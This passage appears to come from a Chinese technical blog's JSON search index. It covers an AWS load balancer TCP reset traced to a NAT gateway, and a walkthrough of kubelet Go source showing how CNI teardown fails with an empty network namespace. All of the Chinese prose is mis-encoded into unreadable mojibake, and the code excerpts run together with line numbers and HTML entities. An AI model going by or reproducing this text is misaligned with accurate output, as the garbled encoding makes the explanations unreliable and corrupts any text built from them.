-&gt; nlb -&gt; node -&gt; container è¿™ä¸ªæ˜¯æµé‡è¿›å…¥çš„è¿‡ç¨‹ï¼Œcotnainer -&gt; node -&gt; nlb -&gt; client è¿™ä¸ªæ˜¯é¢„æœŸçš„è¿”å›è·¯å¾„ï¼Œä½†æ˜¯ç°åœ¨æ ¹æ®åœ¨å„èŠ‚ç‚¹çš„æŠ“åŒ…è¡Œä¸ºæ˜¯ container -&gt; node -&gt; nlb ç„¶å nlb å†’å……å®¢æˆ·ç«¯å‘äº† reset ç»™ nodeï¼Œnode å°†è¿™ä¸ª reset è½¬å‘ç»™äº† podï¼›è€ŒçœŸå®å®¢æˆ·ç«¯ä¸€è‡´åœ¨å‘é€ tcp é‡ä¼ ã€‚ åœ¨èŠ‚ç‚¹ä¸ŠæŠ“åˆ°çš„æ•°æ®åŒ…ï¼š out-of-cotnainer-reset-tcp åœ¨å®¹å™¨ä¸­æŠ“åˆ°é¢æ•°æ®åŒ…ï¼š in-container ä½†æ˜¯åœ¨å®¢æˆ·ç«¯æŠ“åŒ…æ˜¯å‘ç°çš„é‡ä¼ ï¼Œæ²¡æœ‰å‘èµ· tcp restã€‚ in-container åŸºäºä¸Šè¿°æŠ“åŒ…å¯ä»¥åˆæ­¥æ–­å®šè¿™ä¸ª tcp reset éå¸¸å¯èƒ½æ˜¯ aws çš„è®¾å¤‡å†’å……å®¢æˆ·ç«¯å‘è¿‡æ¥çš„ã€‚ nlb çš„å®ç°çš„é—®é¢˜ï¼Ÿä¸Šè¿°è¿™æ ·çš„ç°è±¡çœŸçš„è®©çŸ¥è¯†åŒ®ä¹çš„æˆ‘è´¹è§£ï¼ŒGoogle ä¸€ä¸‹å‘ç°å‘ç° case^Adobe å¤§ä½¬çš„ case ï¼Œè¿˜æœ‰åœ¨ fw [^challenge ACK]çš„åœºæ™¯ä¸­æœ‰ç±»ä¼¼çš„è¡Œä¸ºã€‚ä¸¤ä¸ªæ–‡ç« éƒ½æä¾›äº†å…³é”®è¯RFC rfc5961ï¼Œä»æ–‡æ¡£ä¹Ÿæ²¡æœ‰çœ‹å‡ºæ¥æœ‰ä»€ä¹ˆç›¸å…³æ€§ï¼Œè¿™ä¸ª rfc ä¸»è¦æ˜¯é’ˆå¯¹ tcp çš„å®‰å…¨å¼ºåŒ–ï¼Œè§£å†³å‡ ç§é’ˆå¯¹çš„ tcp çš„æ”»å‡» Blind Reset Attack Using the RST Bit Blind Reset Attack Using the SYN Bit Blind Data Injection Attack çœ‹ç€ä¸Šé¢ 3 ä¸ªæ”»å‡»éƒ½æ„Ÿè§‰ä¸åˆ°å’Œæˆ‘åœºæ™¯æœ‰ä»€ä¹ˆå…³ç³»ï¼Œå› ä¸ºè¿™ä¸€ç±»çš„æ”»å‡»éƒ½æ˜¯é’ˆå¯¹ establish çš„ tcp ä¿¡é“çš„ï¼Œè€Œåœ¨æˆ‘çš„ case é‡Œé¢éƒ½æ²¡æœ‰å»ºç«‹å¥½ tcp é“¾æ¥ã€‚ ç»†çœ‹åé¢çš„æè¿° Middlebox Considerations çš„ section çš„å‡ ä¸ª subsection å…¶å®å’Œæˆ‘åœºæ™¯ä¹Ÿä¸ç›¸å…³ï¼Œ9.1 sub section è¯´çš„æ˜¯æŸä¸ª endpoint å‘é€ rst ä½†æ˜¯ Middlebox æˆ–è€… å¯¹ç«¯å®ç°æ»åäº rfc5961ï¼Œå…¶ä½™ä¸¤ä¸ªä¹Ÿä¸ç›¸å…³ã€‚ æäº†å·¥å•ç»™ aws äº†ï¼Œå› ä¸ºçš„ç¡®åœ¨ä»–çš„ nlb ç›‘æ§ä¸Šçœ‹åˆ°äº† nlb-loadbalancer-rest AWS çš„çš„å›å¤åŸºäº aws çš„å›å¤ç¡®è®¤è¿˜æ˜¯æˆ‘çš„ä½¿ç”¨å§¿åŠ¿é—®é¢˜ï¼Œè¿™ä¸ª tcp rest æ˜¯ natgw å‘é€çš„ã€‚ å…¥æµé‡ client -&gt; lb -&gt; instance -&gt; nat -&gt; podï¼Œè¿”å›æµç¨‹æ˜¯ pod -&gt; nat -&gt; instance -&gt; natgw å› ä¸ºä¿ç•™äº†å®¢æˆ·ç«¯çœŸå®æ¥æºï¼Œè€Œ natgw æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„æ¡ç›®ã€‚ reference[^challenge ACK]:[challenge ACK]|(https://www.networkdefenseblog.com/post/wireshark-tcp-challenge-ack)","tags":["k8s"]},{"title":"kubelet æ˜¯å¦‚ä½•é…åˆ CNI åˆ é™¤å®¹å™¨ç½‘ç»œ","path":"/2020/06/02/how-kubelet-to-use-cni/","content":"è¿™å‘¨ååŠ©åŒäº‹è§£å†³çº¿ä¸ŠCNIæ’ä»¶åˆ é™¤PODä½†æ˜¯æŠ¥é”™ä¿¡æ¯è¯´ network namespace ä¸ºç©ºï¼Œå…·ä½“é”™è¯¯ä¿¡æ¯å¦‚ä¸‹å›¾ cni network namespace not found çœ‹äº†ä¸€çœ¼ä»£ç æ„Ÿè§‰ä¸æ˜¯æˆ‘ä¸€æ—¶åŠä¼šèƒ½æå®šçš„äº‹æƒ…ï¼Œå°±å€Ÿè¿™ä¸ªé—®é¢˜ä¸ºå¥‘æœºé˜…è¯»ä¸€ä¸‹kubeletçš„éƒ¨åˆ†ä»£ç ï¼Œç†Ÿæ‚‰ä¸€ä¸‹kubeletæ˜¯å¦‚ä½•åˆ é™¤PODç½‘ç»œï¼Œå¦‚æœä»¥ååˆè¦å¤„ç†è¿™æ ·é—®é¢˜å°±å¯ä»¥æœ‰çš„æ”¾çŸ¢ã€‚ åœ¨çº¿ä¸Šåˆ†æå¯ä»¥çœ‹åˆ°kubeletçš„å¯åŠ¨å‚æ•°å«æœ‰æ˜¯ --network-plugin=cniï¼Œæ ¹æ®è¿™ä¸ªä¿¡æ¯ä¸ºçº¿ç´¢æ¢³ç†kubeletæ˜¯å¦‚ä½•é”€æ¯ä¸€ä¸ª pod çš„network namespace ã€‚ å‡†å¤‡ä»¥kubeletç½‘ç»œéƒ¨åˆ†çš„åˆå§‹åŒ–ï¼Œkubeletå¦‚ä½•é”€æ¯PODï¼Œkubeletå¦‚ä½•ä½¿ç”¨CNIå›æ”¶ç½‘ç»œèµ„æºè¿™æ ·çš„å½¢å¼å»ç»„ç»‡è¿™ç¯‡ã€‚ kubelet ç½‘ç»œéƒ¨åˆ†çš„åˆå§‹åŒ–å› ä¸ºåŒ†åŒ†æ‰“å¼€ kubelet ä»£ç æ„Ÿè§‰æœ‰ç‚¹å¤æ‚ï¼Œå•çº¯çš„çœ‹é”€æ¯é€»è¾‘è®©æˆ‘å›°æƒ‘ä¸ºä»€ä¹ˆkubelet è°ƒç”¨è¿™ä¸ª plugin çš„å®ç°ï¼Œè€Œä¸æ˜¯é‚£ä¸€ä¸ªå®ç°ï¼Œæ‰€ä»¥è®¡åˆ’æ¢³ç†ä¸€ä¸‹ kubelet æ˜¯å¦‚ä½•å¯åŠ¨å¹¶å¼€å§‹å®ƒçš„ä¸»æµç¨‹ã€‚ kubelet å¯åŠ¨å‡†å¤‡å·¥ä½œå®åœ¨æ˜¯æœ‰äº›å¤šï¼Œç®€å•æ•´ç†ä¸€ä¸‹è°ƒç”¨å‡½æ•°ç›´æ¥çš„å…³ç³»ä»ä¸»å‡½æ•°è°ƒç”¨å¼€å§‹ NewKubeletCommand() -&gt; Run(kubeletServer, kubeletDeps, utilfeature.DefaultFeatureGate, stopCh)-&gt;run(s, kubeDeps, featureGate, stopCh)-&gt;RunKubelet(s, kubeDeps, s.RunOnce) è¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨createAndInitKubelet()ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ContainerRuntimeOptionsç»“æ„ä½“ï¼Œå…¶ä¸­æœ‰ä¸ªå­—æ®µå°±æ˜¯ä¸Šå±‚ä¼ ä¸‹æ¥çš„NetworkPluginNameï¼Œåœ¨æˆ‘ä»¬çš„caseä¸­è¿™ä¸ªå€¼æ˜¯ä»å‘½ä»¤è¡Œå»æ¥çš„cniå­—ç¬¦ä¸²ã€‚ 123456789101112131415// RunKubelet is responsible for setting up and running a kubelet. It is used in three different applications:// 1 Integration tests// 2 Kubelet binary// 3 Standalone &#x27;kubernetes&#x27; binary// Eventually, #2 will be replaced with instances of #3func RunKubelet(kubeServer *options.KubeletServer, kubeDeps *kubelet.Dependencies, runOnce bool) error &#123;...\tk, err := createAndInitKubelet(&amp;kubeServer.KubeletConfiguration, kubeDeps, &amp;kubeServer.ContainerRuntimeOptions, // æ’ä»¶åå­—å°±æ˜¯è¿™ä¸ªå˜é‡çš„ä¸€ä¸ªå­—æ®µ... kubeServer.NodeStatusMaxImages)\tif err != nil &#123; return fmt.Errorf(&quot;failed to create kubelet: %v&quot;, err)\t&#125; 1234567891011121314func createAndInitKubelet(kubeCfg *kubeletconfiginternal.KubeletConfiguration,\tkubeDeps *kubelet.Dependencies,\tcrOptions *config.ContainerRuntimeOptions, // ä¸Šè¿°å‚æ•°çš„å½¢å‚...\tnodeStatusMaxImages int32) (k kubelet.Bootstrap, err error) &#123;\t// TODO: block until all sources have delivered at least one update to the channel, or break the sync loop\t// up into &quot;per source&quot; synchronizations\tk, err = kubelet.NewMainKubelet(kubeCfg, kubeDeps, crOptions, // ä¸€è·¯å°†å˜é‡ä¼ é€’åˆ°ä¸‹é¢å‡½æ•°...\treturn k, nil&#125; 1234567891011121314151617181920212223242526// NewMainKubelet instantiates a new Kubelet object along with all the required internal modules.// No initialization of Kubelet and its modules should happen here.func NewMainKubelet(kubeCfg *kubeletconfiginternal.KubeletConfiguration,\tkubeDeps *Dependencies,\tcrOptions *config.ContainerRuntimeOptions, // container runtime é€‰é¡¹å‚æ•°...\t// TODO: These need to become arguments to a standalone docker shim.\tpluginSettings := dockershim.NetworkPluginSettings&#123; HairpinMode: kubeletconfiginternal.HairpinMode(kubeCfg.HairpinMode), NonMasqueradeCIDR: nonMasqueradeCIDR, PluginName: crOptions.NetworkPluginName, // NetworkPluginName å˜é‡å€¼ cni PluginConfDir: crOptions.CNIConfDir, PluginBinDirString: crOptions.CNIBinDir, PluginCacheDir: crOptions.CNICacheDir, MTU: int(crOptions.NetworkPluginMTU),\t&#125;... switch containerRuntime &#123;\tcase kubetypes.DockerContainerRuntime: // è¿™ä¸ªå€¼æ˜¯ dockerï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœºæ™¯çš„å€¼ // Create and start the CRI shim running as a grpc server. streamingConfig := getStreamingConfig(kubeCfg, kubeDeps, crOptions) ds, err := dockershim.NewDockerService(kubeDeps.DockerClientConfig, crOptions.PodSandboxImage, streamingConfig, &amp;pluginSettings, runtimeCgroups, kubeCfg.CgroupDriver, crOptions.DockershimRootDirectory, !crOptions.RedirectContainerStreaming, crOptions.NoJsonLogPath) // pluginSettings é‡Œé¢å«æœ‰ network plugin åç§°...\treturn klet, nil&#125; åœ¨NewDockerServiceå‡½æ•°ä¸­ä¼šè°ƒç”¨InitNetworkPluginå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯æ„å»ºdockerserviceç½‘ç»œå­—æ®µçš„å…³é”®ã€‚ 123456789101112131415// NewDockerService creates a new `DockerService` struct.// NOTE: Anything passed to DockerService should be eventually handled in another way when we switch to running the shim as a different process.func NewDockerService(config *ClientConfig, podSandboxImage string, streamingConfig *streaming.Config, pluginSettings *NetworkPluginSettings,\tcgroupsName string, kubeCgroupDriver string, dockershimRootDir string, startLocalStreamingServer bool, noJsonLogPath string) (DockerService, error) &#123;...\tds := &amp;dockerService&#123;...\tplug, err := network.InitNetworkPlugin(cniPlugins, pluginSettings.PluginName, netHost, pluginSettings.HairpinMode, pluginSettings.NonMasqueradeCIDR, pluginSettings.MTU) // è¿™ä¸ªå‡½æ•°æ˜¯æ„å»º plugin æ¥å£çš„å…³é”®\tif err != nil &#123; return nil, fmt.Errorf(&quot;didn&#x27;t find compatible CNI plugin with given settings %+v: %v&quot;, pluginSettings, err)\t&#125;\tds.network = network.NewPluginManager(plug) // DockerService çš„ network å­—æ®µ...\treturn ds, nil&#125; å¤šæ•°åœºæ™¯ kubelet æŒ‡å®š plugin åå­—ä¸º cni æˆ–è€… kubenet è¶³å¤Ÿäº†ï¼Œè¿™ä¸ªåˆå§‹åŒ–çš„é€»è¾‘å°±æ˜¯åœ¨è¿™ä¸ªè°ƒç”¨ä¸­ network.InitNetworkPlugin(cniPlugins, pluginSettings.PluginName, netHost, pluginSettings.HairpinMode, pluginSettings.NonMasqueradeCIDR, pluginSettings.MTU)ï¼Œå¯ä»¥åœ¨ kubeletçš„ç›®å½•ä¸‹é¢çœ‹åˆ° cni å’Œ kubenet ä¸¤ä¸ªåŒ…å®ç°äº† plugin interfaceã€‚ æˆ‘è®¤ä¸ºä¸ºäº†å¤„ç†PODåˆ é™¤æ—¶å€™ç½‘ç»œé—®é¢˜å¯¹å¯åŠ¨æµç¨‹åˆ†æåˆ°è¿™é‡Œå°±è¶³å¤Ÿäº†ï¼ŒçŸ¥é“äº†å¦‚ä½•kubeletåˆå§‹åŒ–å‡†å¤‡è°ƒç”¨ cni çš„å®ç°ã€‚ kubelet è°ƒç”¨ç½‘ç»œæ¥å£æŠ½è±¡åœ¨ä¸Šé¢åˆå§‹åŒ–çš„è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°è®¾ç½®dockerserviceçš„pluginï¼Œplugin interfaceè®¾è®¡ä¸»è¦å…³æ³¨ä¸¤ä¸ªæ¥å£ä¸€ä¸ªæ˜¯SetUpPodï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯TearDownPodã€‚ çœ‹æ³¨é‡Šå¯èƒ½è¦é¢å¤–æ³¨æ„ï¼Œåœ¨è¿™ä¸ªä¸¤ä¸ªæ¥å£çš„è®¾è®¡ä¸­éƒ½æœ‰å¯¹infra containeré¢„è®¾å‰æï¼Œå…·ä½“å¯ä»¥çœ‹ä¸€ä¸‹æ³¨é‡Šã€‚ 123456789101112// NetworkPlugin is an interface to network plugins for the kubelettype NetworkPlugin interface &#123;...\t// SetUpPod is the method called after the infra container of\t// the pod has been created but before the other containers of the\t// pod are launched. // çœ‹ä¸Šé¢æ³¨é‡Šï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ç”¨æ¥å‡†å¤‡ POD è¿è¡Œæ—¶çš„ç½‘ç»œç¯å¢ƒçš„\tSetUpPod(namespace string, name string, podSandboxID kubecontainer.ContainerID, annotations, options map[string]string) error\t// TearDownPod is the method called before a pod&#x27;s infra container will be deleted // è¿™ä¸ªå‡½æ•°æ˜¯ç”¨åœ¨ POD é”€æ¯çš„æµç¨‹ä¸­çš„ï¼Œä½†æ˜¯åœ¨æ¥å£è®¾è®¡ä¸­æœ‰å‡è®¾åœ¨ infra container è¢«é”€æ¯å‰\tTearDownPod(namespace string, name string, podSandboxID kubecontainer.ContainerID) error kubelet å¦‚ä½•é”€æ¯å®¹å™¨å‰é¢çœ‹äº†kubeletå¯åŠ¨åˆå§‹åŒ–ï¼Œå‡ºäºæ–‡ç« çš„å®Œæ•´æ€§è€ƒè™‘æ¢³ç†ä¸€ä¸‹PODé”€æ¯åœºæ™¯ä¸‹å‡ ä¸ªä¸»è¦å‡½æ•°çš„è°ƒç”¨å…³ç³»ã€‚ åœ¨æœ€å¼€å§‹kubeletå¯åŠ¨çš„æ—¶å€™çŸ¥é“äº†å‡½æ•°è°ƒç”¨åˆ°RunKubelet()ï¼Œåé¢å…¶å®è¿˜æœ‰RunKubelet()-&gt;startKubelet()-&gt;k.Run(podCfg.Updates()) 1234567// Run starts the kubelet reacting to config updatesfunc (kl *Kubelet) Run(updates &lt;-chan kubetypes.PodUpdate) &#123;...\t// Start the pod lifecycle event generator.\tkl.pleg.Start()\tkl.syncLoop(updates, kl) // è¿™ä¸ªåœ°æ–¹å°±æ˜¯ kubelet å®é™…è¿è¡Œçš„æ ¸å¿ƒä»£ç äº†&#125; åœ¨ syncLoop ä¸­æ ¹æ®æ”¶åˆ°çš„äº‹ä»¶è¿›è¡Œå¤„ç†å°±æ˜¯kubeletæ ¸å¿ƒé€»è¾‘ï¼Œè¿™é‡Œåªå…³æ³¨podæ˜¯å¦‚ä½•å¼€å§‹åˆ é™¤çš„ã€‚ 123456789func (kl *Kubelet) syncLoopIteration(configCh &lt;-chan kubetypes.PodUpdate, handler SyncHandler,\tsyncCh &lt;-chan time.Time, housekeepingCh &lt;-chan time.Time, plegCh &lt;-chan *pleg.PodLifecycleEvent) bool &#123;\tselect &#123;... switch u.Op &#123; // è¿™é‡Œå¯¹æ“ä½œç±»å‹åšæ–­è¨€ï¼Œä¸é€šçš„ç±»å‹å¯¹åº”ä¸åŒçš„å¤„ç†å‡½æ•°ã€‚... case kubetypes.REMOVE: klog.V(2).Infof(&quot;SyncLoop (REMOVE, %q): %q&quot;, u.Source, format.Pods(u.Pods)) handler.HandlePodRemoves(u.Pods) è¿™ä¸ªsyncLoopIterationå‡½æ•°å‘Šè¯‰ä½ ä»å‡ ä¸ªæ¸ é“è§¦å‘ä¸»å¾ªç¯ï¼Œhandlerå˜é‡å­˜æ”¾è¿™å¤„ç†è¿™äº›äº‹ä»¶çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹éƒ¨åˆ†å®ç°ï¼ˆè¿™ä¸ªå‡½æ•°çš„æ³¨é‡Šå†™çš„å¾ˆæ¸…æ¥šï¼Œå‘Šè¯‰ä½ æ¯ä¸ª channel é‡Œé¢æ˜¯ä»€ä¹ˆï¼‰ 123456789101112131415161718// HandlePodRemoves is the callback in the SyncHandler interface for pods// being removed from a config source.func (kl *Kubelet) HandlePodRemoves(pods []*v1.Pod) &#123; start := kl.clock.Now() for _, pod := range pods &#123; kl.podManager.DeletePod(pod) if kubetypes.IsMirrorPod(pod) &#123; kl.handleMirrorPod(pod, start) continue &#125; // Deletion is allowed to fail because the periodic cleanup routine // will trigger deletion again. if err := kl.deletePod(pod); err != nil &#123; // è¿™é‡Œå°±æ˜¯åˆ é™¤ POD çš„æ ¸å¿ƒ klog.V(2).Infof(&quot;Failed to delete pod %q, err: %v&quot;, format.Pod(pod), err) &#125; kl.probeManager.RemovePod(pod) &#125;&#125; deletePod()å‡½æ•°å…¶å®å¹¶ä¸æ˜¯çœŸçš„deletePODä»…ä»…æ˜¯å°†æœŸæœ›è¢«åˆ é™¤çš„PODä¸¢æ‰podKillingChä¸­ã€‚ 12345678910111213141516// deletePod deletes the pod from the internal state of the kubelet by:// 1. stopping the associated pod worker asynchronously// 2. signaling to kill the pod by sending on the podKillingCh channel//// deletePod returns an error if not all sources are ready or the pod is not// found in the runtime cache.func (kl *Kubelet) deletePod(pod *v1.Pod) error &#123;... podPair := kubecontainer.PodPair&#123;APIPod: pod, RunningPod: &amp;runningPod&#125; kl.podKillingCh &lt;- &amp;podPair // è¿™é‡Œ // TODO: delete the mirror pod here? // We leave the volume/directory cleanup to the periodic cleanup routine. return nil&#125; æ ¹æ®è¿™ä¸ª channel æ‰¾åˆ°åˆ é™¤æµç¨‹çš„ä»£ç ï¼Œè¿™ä¸ªä»£ç æ˜¯ä»¥ä¸€ä¸ªgo routing ç‹¬ç«‹è¿è¡Œgo wait.Until(kl.podKiller, 1*time.Second, wait.NeverStop)ã€‚ 1234567891011// podKiller launches a goroutine to kill a pod received from the channel if// another goroutine isn&#x27;t already in action.func (kl *Kubelet) podKiller() &#123;...\tfor podPair := range kl.podKillingCh &#123; // è¿™åœ°æ–¹å¯ä»¥çœ‹åˆ°é€šè¿‡ channel æ²Ÿé€š... if !exists &#123; go func(apiPod *v1.Pod, runningPod *kubecontainer.Pod) &#123; klog.V(2).Infof(&quot;Killing unwanted pod %q&quot;, runningPod.Name) err := kl.killPod(apiPod, runningPod, nil, nil) // è¿™é‡Œå°±æ˜¯åšå®é™…çš„åˆ é™¤... çœ‹ä¸‹é¢ä»£ç çŸ¥é“äº†å®é™…è°ƒç”¨äº†containerRuntimeçš„KillPodæ¥å£ 1234567// One of the following arguments must be non-nil: runningPod, status.// TODO: Modify containerRuntime.KillPod() to accept the right arguments.func (kl *Kubelet) killPod(pod *v1.Pod, runningPod *kubecontainer.Pod, status *kubecontainer.PodStatus, gracePeriodOverride *int64) error &#123;...\t// Call the container runtime KillPod method which stops all running containers of the pod\tif err := kl.containerRuntime.KillPod(pod, p, gracePeriodOverride); err != nil &#123; // here... çœ‹ä¸€ä¸‹KillPodè¿™ä¸ªinterfaceçš„å®ç°å¦‚ä¸‹ï¼Œæ²¡æœ‰æ²¡æœ‰å¤ªå¤šæ ¸å¿ƒé€»è¾‘ 1234567// KillPod kills all the containers of a pod. Pod may be nil, running pod must not be.// gracePeriodOverride if specified allows the caller to override the pod default grace period.// only hard kill paths are allowed to specify a gracePeriodOverride in the kubelet in order to not corrupt user data.// it is useful when doing SIGKILL for hard eviction scenarios, or max grace period during soft eviction scenarios.func (m *kubeGenericRuntimeManager) KillPod(pod *v1.Pod, runningPod kubecontainer.Pod, gracePeriodOverride *int64) error &#123;\terr := m.killPodWithSyncResult(pod, runningPod, gracePeriodOverride)... 123456789101112131415161718192021// killPodWithSyncResult kills a runningPod and returns SyncResult.// Note: The pod passed in could be *nil* when kubelet restarted.func (m *kubeGenericRuntimeManager) killPodWithSyncResult(pod *v1.Pod, runningPod kubecontainer.Pod, gracePeriodOverride *int64) (result kubecontainer.PodSyncResult) &#123;\tkillContainerResults := m.killContainersWithSyncResult(pod, runningPod, gracePeriodOverride)\tfor _, containerResult := range killContainerResults &#123; result.AddSyncResult(containerResult)\t&#125;\t// stop sandbox, the sandbox will be removed in GarbageCollect\tkillSandboxResult := kubecontainer.NewSyncResult(kubecontainer.KillPodSandbox, runningPod.ID)\tresult.AddSyncResult(killSandboxResult)\t// Stop all sandboxes belongs to same pod\tfor _, podSandbox := range runningPod.Sandboxes &#123; if err := m.runtimeService.StopPodSandbox(podSandbox.ID.ID); err != nil &#123; // è¿™é‡Œæ˜¯åˆ é™¤ POD çš„ sandbox killSandboxResult.Fail(kubecontainer.ErrKillPodSandbox, err.Error()) klog.Errorf(&quot;Failed to stop sandbox %q&quot;, podSandbox.ID) &#125;\t&#125;\treturn&#125; killContainersWithSyncResult() æ–¹æ³•çš„å®ç°å°±æ˜¯ä»PODçš„æ“ä½œè½¬æ¢ä¸º container æ“ä½œçš„æ ¸å¿ƒï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¹‹å‰å…¨éƒ¨æ“ä½œéƒ½æ˜¯å›´ç»•è¿™ä¸ªPODï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¹‹åè°ƒç”¨å‡½æ•°æ“ä½œå¯¹è±¡éƒ½æ˜¯ containerã€‚ è€Œä¸”è¿™ä¸ªå‡½æ•°ä¿è¯äº†others conainteråˆ é™¤æ—©äº sandbox containeråˆ é™¤ã€‚ åé¢å‡½æ•°è°ƒç”¨å°±æ¯”è¾ƒç®€å•äº†m.killContainersWithSyncResult(pod, runningPod, gracePeriodOverride) -&gt; m.runtimeService.StopPodSandbox(podSandbox.ID.ID) -&gt; r.runtimeClient.StopPodSandbox(ctx, &amp;runtimeapi.StopPodSandboxRequest&#123;PodSandboxId: podSandBoxID&#125;)ã€‚ å¯¹åˆ é™¤æµç¨‹æˆ‘ä»¬è·Ÿåˆ°è¿™ä¸ªStopPodSandboxæ–¹æ³•è°ƒç”¨æˆ‘è®¤ä¸ºå°±å¤Ÿäº†ï¼Œä¹‹æ‰€ä»¥è®¤ä¸ºå¤Ÿäº†æ˜¯åŸå› åœ¨æ­¤ä¹‹å‰é€»è¾‘éƒ½æ˜¯åœ¨kubeletè‡ªå·±ä¸»å¾ªç¯ä¸­ï¼Œè€Œä¹‹åçš„é€»è¾‘éƒ½æ˜¯èµ°çš„ grpcã€‚ kubelet å¦‚ä½•å›æ”¶ç½‘ç»œæœ‰äº†ä¹‹å‰çš„åˆ†æï¼Œç°åœ¨çœ‹ä¸€ä¸‹æ˜¯å¦‚ä½•å®ç°StopPodSandbox è¿™ä¸ªæœåŠ¡æ˜¯å¦‚ä½•å®ç°çš„ 123456789var _RuntimeService_serviceDesc = grpc.ServiceDesc&#123;\tServiceName: &quot;runtime.v1alpha2.RuntimeService&quot;,\tHandlerType: (*RuntimeServiceServer)(nil),\tMethods: []grpc.MethodDesc&#123;... &#123; MethodName: &quot;StopPodSandbox&quot;, Handler: _RuntimeService_StopPodSandbox_Handler, &#125;, _RuntimeService_StopPodSandbox_Handlerçš„å®ç°ä¼šè°ƒç”¨StopPodSandbox()ï¼Œåé¢çœ‹ä¸€ä¸‹StopPodSandbox()çš„å®ç°ã€‚ 1234567891011121314151617181920212223// StopPodSandbox stops the sandbox. If there are any running containers in the// sandbox, they should be force terminated.// TODO: This function blocks sandbox teardown on networking teardown. Is it// better to cut our losses assuming an out of band GC routine will cleanup// after us?func (ds *dockerService) StopPodSandbox(ctx context.Context, r *runtimeapi.StopPodSandboxRequest) (*runtimeapi.StopPodSandboxResponse, error) &#123;\tvar namespace, name string\tvar hostNetwork bool....\t// WARNING: The following operations made the following assumption:\t// 1. kubelet will retry on any error returned by StopPodSandbox.\t// 2. tearing down network and stopping sandbox container can succeed in any sequence.\t// This depends on the implementation detail of network plugin and proper error handling.\t// For kubenet, if tearing down network failed and sandbox container is stopped, kubelet\t// will retry. On retry, kubenet will not be able to retrieve network namespace of the sandbox\t// since it is stopped. With empty network namespcae, CNI bridge plugin will conduct best\t// effort clean up and will not return error.\terrList := []error&#123;&#125;\tready, ok := ds.getNetworkReady(podSandboxID)\tif !hostNetwork &amp;&amp; (ready || !ok) &#123; // Only tear down the pod network if we haven&#x27;t done so already cID := kubecontainer.BuildContainerID(runtimeName, podSandboxID) err := ds.network.TearDownPod(namespace, name, cID) TearDownPodå°±æ˜¯æ•´ä¸ªPODç½‘ç»œé”€æ¯çš„æ ¸å¿ƒå‡½æ•°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°çš„å®ç°ä¸­åšäº†ä¸€éƒ¨åˆ†é¢„è®¾å‰æ infra container åäº others container åˆ é™¤ã€‚ çœ‹ä¸€ä¸‹CNIè¿™ä¸ªåŒ…å¯¹ä¸è¿™ä¸ªå‡½æ•°çš„å®ç°çš„é”€æ¯é€»è¾‘ 12345678910111213func (plugin *cniNetworkPlugin) TearDownPod(namespace string, name string, id kubecontainer.ContainerID) error &#123;\tif err := plugin.checkInitialized(); err != nil &#123; return err\t&#125;\t// Lack of namespace should not be fatal on teardown\tnetnsPath, err := plugin.host.GetNetNS(id.ID) // è¿™é‡Œå°±å°±æ˜¯è·å– namespace çš„ä½¿ç”¨\tif err != nil &#123; klog.Warningf(&quot;CNI failed to retrieve network namespace path: %v&quot;, err) // çœ‹ ELK æŠ¥é”™ä¿¡æ¯æœ‰è¿™ä¸ª\t&#125;...\treturn plugin.deleteFromNetwork(cniTimeoutCtx, plugin.getDefaultNetwork(), name, namespace, id, netnsPath, nil)&#125; 1234func (plugin *cniNetworkPlugin) deleteFromNetwork(ctx context.Context, network *cniNetwork, podName string, podNamespace string, podSandboxID kubecontainer.ContainerID, podNetnsPath string, annotations map[string]string) error &#123;\trt, err := plugin.buildCNIRuntimeConf(podName, podNamespace, podSandboxID, podNetnsPath, annotations, nil) // é€šè¿‡ ELK çœ‹åˆ°ä¹Ÿæœ‰è¿™ä¸ªå‡½æ•°çš„è­¦å‘Š...&#125; 1234567func (plugin *cniNetworkPlugin) buildCNIRuntimeConf(podName string, podNs string, podSandboxID kubecontainer.ContainerID, podNetnsPath string, annotations map[string]string) (*libcni.RuntimeConf, error) &#123;\tglog.V(4).Infof(&quot;Got netns path %v&quot;, podNetnsPath)\tglog.V(4).Infof(&quot;Using podns path %v&quot;, podNs) // è¿™è¡Œåœ¨ ELK é‡Œé¢ä¹Ÿçœ‹åˆ°äº†ï¼ŒpodNs å€¼ä¸º default ä¸ç¬¦åˆé¢„æœŸ 3...\treturn rt, nil&#125; è¿™åé¢å°±æ˜¯æŒ‰ç…§cniçš„æ ‡å‡†è°ƒç”¨cniäºŒè¿›åˆ¶äº†ã€‚ é—®é¢˜åˆ†æåŸºäºä¹‹å‰çš„åˆ†æï¼Œå…¶å®å‡ºé—®é¢˜çš„åœ°æ–¹å¾ˆæ¸…æ¥šäº†ã€‚å°±æ˜¯plugin.host.GetNetNS(id.ID)è¿‡ç¨‹é”™è¯¯äº†ã€‚ 12345678910// GetNetNS returns the network namespace of the given containerID. The ID// supplied is typically the ID of a pod sandbox. This getter doesn&#x27;t try// to map non-sandbox IDs to their respective sandboxes.func (ds *dockerService) GetNetNS(podSandboxID string) (string, error) &#123;\tr, err := ds.client.InspectContainer(podSandboxID) // è¿™ä¸ªå°±æ˜¯è°ƒç”¨ docker client äº†\tif err != nil &#123; return &quot;&quot;, err\t&#125;\treturn getNetworkNamespace(r)&#125; 1234567func (d *kubeDockerClient) InspectContainer(id string) (*dockertypes.ContainerJSON, error) &#123;\tctx, cancel := d.getTimeoutContext()\tdefer cancel()\tcontainerJSON, err := d.client.ContainerInspect(ctx, id) // è¿™ä¸ªåœ°æ–¹å°±æ˜¯...\treturn &amp;containerJSON, nil&#125; 12345678func getNetworkNamespace(c *dockertypes.ContainerJSON) (string, error) &#123; if c.State.Pid == 0 &#123; // Docker reports pid 0 for an exited container. return &quot;&quot;, fmt.Errorf(&quot;cannot find network namespace for the terminated container %q&quot;, c.ID) &#125; // dockerNetNSFmt = &quot;/proc/%v/ns/net&quot; return fmt.Sprintf(dockerNetNSFmt, c.State.Pid), nil &#125; ç»“åˆELKé”™è¯¯æ—¥å¿—åˆæ­¥åˆ¤æ–­å‡ºå°±æ˜¯if c.State.Pid == 0 